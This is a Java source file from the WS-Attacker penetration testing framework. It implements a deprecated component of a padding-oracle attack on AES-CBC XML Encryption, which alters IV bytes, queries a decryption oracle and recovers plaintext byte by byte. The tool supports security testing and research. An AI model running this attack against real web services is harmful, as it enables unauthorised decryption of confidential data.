/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2013 Dennis Kupser
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.library.xmlencryptionattack.attackengine.attacker.cbc;

import java.util.Arrays;
import java.util.LinkedList;
import org.apache.log4j.Logger;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.base.AOracle;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.base.request.CBCOracleRequest;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.base.response.OracleResponse;

/**
 * FindIVMethod takes as input an IV and one ciphertext block. It has the
 * following responsibilities: <ul> <li> Extract all type-A characters from the
 * plaintext ('<' and '&') </li> <li> Set the last byte to 0x01 (this means that
 * only the last one byte is padded and that all the preceeding characters can
 * be accessed) </li> </ul>
 *
 * The FindIVMethod is not able to process XML Strings fitting into one block.
 * Thus, if a ciphertext block would contain the following string:
 * <abc>ab</abc>, the method would most probably fail. However, this is not a
 * typical case of encrypted XML data since typical elements are much longer and
 * contain namespaces so that one element is typically split into several
 * blocks.
 *
 * Currently working only for 16-byte long blocks (AES)!!!
 *
 * @author Juraj Somorovsky - juraj.somorovsky@rub.de
 * @version 0.1
 */
@Deprecated
public class FindIVMethod
    extends Method
{

    Logger LOG = Logger.getLogger( FindIVMethod.class );

    /**
     * block size
     */
    private final int blockSize;

    /**
     * If the last block pairs of the encrypted data are processed, the attacker has to process differently. Thus, this
     * information is hold in this boolean value
     */
    private final boolean processingLastBlock;

    private final FindIVMethodProperties properties;

    private final LinkedList<Integer> paddingByteMasks;

    /**
     * padding masks for the first padding byte part (first four bits)
     */
    private final LinkedList<Integer> firstPaddingBytes;

    /**
     * padding masks for the last four padding byte bits
     */
    private final LinkedList<Integer> secondPaddingBytes;

    /**
     * Constructor accepting an initialization vector and a ciphertext block
     * 
     * @param oracle
     * @param iv
     * @param c1
     * @param processingLastBlock
     */
    public FindIVMethod(AOracle oracle, final byte[] iv, final byte[] c1,
            boolean processingLastBlock) {
        super(oracle, iv, c1);
        this.blockSize = iv.length;
        this.processingLastBlock = processingLastBlock;
        this.properties = new FindIVMethodProperties(blockSize);
        this.paddingByteMasks = new LinkedList<>();
        this.firstPaddingBytes = new LinkedList<>();
        this.secondPaddingBytes = new LinkedList<>();
    }

/**
     * Executes the attack on the cipher value. First, it changes the padding
     * and the special characters ('<', '&'). Then, it executes the attack on
     * the concrete bytes in the cipher value using the FindByteMethod.
     *
     *
     *
     * @return decrypted text
     */
    @Override
    public byte[] executeAttack()
    {

        LOG.info( "FindIV method started" );

        // temporarily store the last IV byte
        byte lastIvByte = iv[blockSize - 1];

        // find padding masks
        findPaddingMasks();

        // extract invalid characters and prepare block
        while ( executePaddingAttack( lastIvByte ) )
            ;

        // by the last block the last byte was already decrypted
        if ( processingLastBlock )
        {
            iv[blockSize - 1] = lastIvByte;
        }
        else
        {
            decryptLastByte( lastIvByte );
        }
        int decryptedLastByte = properties.getByte( blockSize - 1 );

        FindByteMethod findByteMethod = new FindByteMethod( m_Oracle, iv, c1 );

        int notPaddedBytes = blockSize;
        if ( processingLastBlock )
        {
            notPaddedBytes = notPaddedBytes - decryptedLastByte;
        }
        LOG.info( "FindByte method initialized" );
        for ( int i = 0; i < notPaddedBytes; i++ )
        {
            try
            {
                if ( !properties.isByteDecrypted( i ) )
                {
                    LOG.info( "attack on byte: " + i );
                    byte b = findByteMethod.executeAttack( i );
                    properties.setByte( i, b );
                    LOG.info( "\tresult " + b );
                }
            }
            catch ( NoColumnFoundException ncfe )
            {
                LOG.warn( "Byte " + i + " could not be decrypted. Is the file using"
                    + "a different character set or includes strange special" + " characters?" );
                LOG.debug( "debug ", ncfe );
            }
        }
        byte[] decrypted = Arrays.copyOf( properties.getDecryptedBytes(), notPaddedBytes );
        return decrypted;
    }

    /**
     * decrypt last byte to get the padding value
     * 
     * @param lastIvByte
     */
    private void decryptLastByte( byte lastIvByte )
    {
        // get 10 - padding (padding with 16 bytes padded)
        int largestPadding;
        if ( firstPaddingBytes.size() == 1 )
        {
            largestPadding = firstPaddingBytes.get( 0 );
        }
        else
        {
            largestPadding = secondPaddingBytes.get( 0 );
        }
        LOG.debug( "first padding bytes: " + firstPaddingBytes.toString() );
        LOG.debug( "second padding bytes: " + secondPaddingBytes.toString() );
        // set IV to have padding 01
        // but only if the m_Oracle is not last block m_Oracle !!!
        if ( !processingLastBlock )
        {
            iv[blockSize - 1] = (byte) ( 0x11 ^ largestPadding );
        }

        // set last byte of the decrypted text
        byte decryptedLastByte = (byte) ( lastIvByte ^ ( 0x10 ^ largestPadding ) );
        properties.setByte( blockSize - 1, decryptedLastByte );
    }

    private void findPaddingMasks()
    {
        if ( processingLastBlock )
        {
            // we can assume that the last byte is correctly set, this means
            // the decrypted value is 0x10 or 0x0?
            int pm = ( iv[blockSize - 1] & 0xf0 ) >> 4;
            paddingByteMasks.add( pm );
            paddingByteMasks.add( pm ^ 1 );
        }
        else
        {
            // get the highest bit: 0 or 1
            int highestBit = iv[blockSize - 1] & 0x80;
            highestBit = highestBit >> 4;
            // iterate through 4 LSBs
            for ( int j = 0; j < 16; j++ )
            {
                // iterate through 8 padding masks
                for ( int i = ( 0 + highestBit ); i < ( 8 + highestBit ); i++ )
                {
                    // get byte
                    int b = i * 16 + j;
                    // set the last Block
                    iv[blockSize - 1] = (byte) b;
                    CBCOracleRequest req = new CBCOracleRequest( iv, c1 );
                    OracleResponse resp = m_Oracle.queryOracle( req );

                    if ( resp.getResult() == OracleResponse.Result.VALID )
                    {
                        // add this padding mask and padding byte to the lists
                        paddingByteMasks.add( i );
                        firstPaddingBytes.add( b );
                        // compute the second padding mask (i xor 1) and add it
                        // to the list
                        paddingByteMasks.add( i ^ 1 );
                        LOG.info( "padding bytes masks found: " + paddingByteMasks.toString() );
                        return;
                    }

                }
            }
        }
    }

    private boolean executePaddingAttack( byte lastIvByte )
    {

        // iterate through 2 masks
        for ( int i : paddingByteMasks )
        {
            // if we have two padding masks and that mask is not included,
            // continue with next mask
            if ( this.handlePaddingMask( i ) )
            {
                // iterate through 4 LSBs
                for ( int j = 0; j < 16; j++ )
                {
                    // get byte
                    int b = i * 16 + j;
                    // if the byte has not already been tested
                    if ( !firstPaddingBytes.contains( b ) && !secondPaddingBytes.contains( b ) )
                    {
                        iv[blockSize - 1] = (byte) b;
                        CBCOracleRequest req = new CBCOracleRequest( iv, c1 );
                        OracleResponse resp = m_Oracle.queryOracle( req );

                        if ( resp.getResult() == OracleResponse.Result.VALID )
                        {
                            LOG.info( "no error for byte mask: " + Integer.toHexString( i ) + " - adding " + b
                                + " to padding bytes" );

                            if ( !paddingByteMasks.contains( i ) )
                            {
                                paddingByteMasks.add( i );
                            }
                            if ( paddingByteMasks.get( 0 ) == i )
                            {
                                firstPaddingBytes.add( b );
                            }
                            else
                            {
                                secondPaddingBytes.add( b );
                            }
                        }
                    }
                }
            }
        }
        int correctResponses = firstPaddingBytes.size() + secondPaddingBytes.size();

        int correctResponsesNeeded;
        if ( processingLastBlock )
        {
            if ( !properties.isByteDecrypted( blockSize - 1 ) )
            {
                decryptLastByte( lastIvByte );
            }
            correctResponsesNeeded = blockSize - properties.getByte( blockSize - 1 );
            LOG.info( "Padding in the last block is " + properties.getByte( blockSize - 1 ) + ", so we need "
                + correctResponsesNeeded + " correct responses" );

        }
        else
        {
            correctResponsesNeeded = blockSize;
        }

        if ( correctResponses >= correctResponsesNeeded )
        {
            return false;
        }
        else
        {
            final int leftBracketPosition = correctResponses - 1;
            // if ( properties.isByteDecrypted( ( leftBracketPosition ) ) )
            // {
            // byte[] decc = new byte[blockSize * 2];
            // for ( int i = 0; i < blockSize; i++ )
            // {
            // decc[i] = iv[i];
            // decc[i + blockSize] = c1[i];
            // }
            // byte[] encodedBytes = Base64.encodeBase64( decc );
            // LOG.info( new String( encodedBytes ) );
            // return false;
            // }
            // we have x correct responses. That means, that the byte on the
            // (x-1) place must be changed since it is '<' or '&' (we assume
            // here
            // the plaintext can include only '<')
            iv[leftBracketPosition] = (byte) ( iv[leftBracketPosition] ^ 0x01 );
            properties.setByte( ( leftBracketPosition ), (byte) '<' );
            LOG.info( "setting byte " + ( leftBracketPosition ) + " to '<' as we got " + correctResponses
                + " correct responses in this round" );
            return true;
        }
    }

    private boolean handlePaddingMask( int mask )
    {
        // not both masks found
        if ( paddingByteMasks.size() != 2 )
        {
            return true;
        }
        else if ( paddingByteMasks.contains( mask ) )
        {
            // the mask is already there
            // if both padding byte lists are of size '1', that means that a
            // special character
            // was found on the second place, e.g.: x<xyz>bla
            // in this case, after first run, we get two paddings: 0x10, 0x0F
            // we want to find the mask with padding 0x00, but it is impossible
            // as we have only two padding bytes
            // therefore, we have to iterate over both masks
            if ( ( firstPaddingBytes.size() <= 1 ) && ( secondPaddingBytes.size() <= 1 ) )
            {
                return true;
                // the mask already has more than one padding bytes or no
                // padding byte
            }
            else if ( ( paddingByteMasks.get( 0 ) == mask )
                && ( ( firstPaddingBytes.size() > 1 ) || firstPaddingBytes.size() == 0 ) )
            {
                return true;
            }
            else if ( ( paddingByteMasks.get( 1 ) == mask ) && ( secondPaddingBytes.size() > 1 )
                || secondPaddingBytes.size() == 0 )
            {
                return true;
            }
        }
        return false;
    }

    public FindIVMethodProperties getProperties()
    {
        return properties;
    }
}
